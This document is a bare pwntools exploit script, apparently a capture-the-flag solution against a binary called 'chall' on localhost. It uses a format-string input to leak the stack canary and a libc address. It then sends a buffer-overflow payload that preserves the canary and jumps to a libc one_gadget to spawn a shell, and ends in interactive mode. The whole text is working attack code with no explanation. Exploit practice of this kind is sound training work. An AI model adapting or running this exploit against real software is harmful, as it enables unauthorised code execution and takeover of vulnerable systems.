from pwn import *

# p = process('chall')
p = remote('localhost', 7777)
e = ELF('chall')
libc = ELF('libc-2.27.so')

one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]

p.sendline("%p." * 16)
leaks = p.recvline()[:-1].split(b'.')
print(leaks)
canary = int(leaks[-4], 16)
libc.address = int(leaks[-2], 16) - 0xe7 - libc.symbols['__libc_start_main']
print(hex(canary))
print(hex(libc.address))

payload = b'\x00' * 0x48
payload += p64(canary)
payload += p64(one_gadget[1] + libc.address) * 2

p.sendline(payload)

p.interactive()
